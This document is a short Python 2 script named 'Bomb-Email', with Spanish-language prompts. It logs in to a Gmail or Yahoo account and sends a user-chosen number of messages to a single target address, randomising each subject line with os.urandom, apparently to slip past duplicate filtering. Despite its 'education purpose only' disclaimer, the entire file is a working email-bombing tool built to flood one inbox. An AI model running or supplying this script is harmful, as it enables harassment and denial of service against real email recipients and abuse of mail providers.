#!/usr/bin/python
#Bomb-Email
#This code for education purpose only.
#Use it at your own risk !!!


import os
import smtplib
import getpass
import sys


server = raw_input ('Elige Gmail/Yahoo?: ')
user = raw_input('Su Email: ')
passwd = getpass.getpass('Su Password: ')


to = raw_input('\nEmail a Spamear: ')
#subject = raw_input('Subject: ') 
body = raw_input('Leyenda del mensaje: ')
total = input('numero de spam: ')

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print 'Solo es valido para Gmail & Yahoo.'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\rE-mails enviado: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n Spam Enviado!!!'
except KeyboardInterrupt:
    print '[-] Cancelado'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] email & pass podrian ser incorrectos'
    sys.exit()
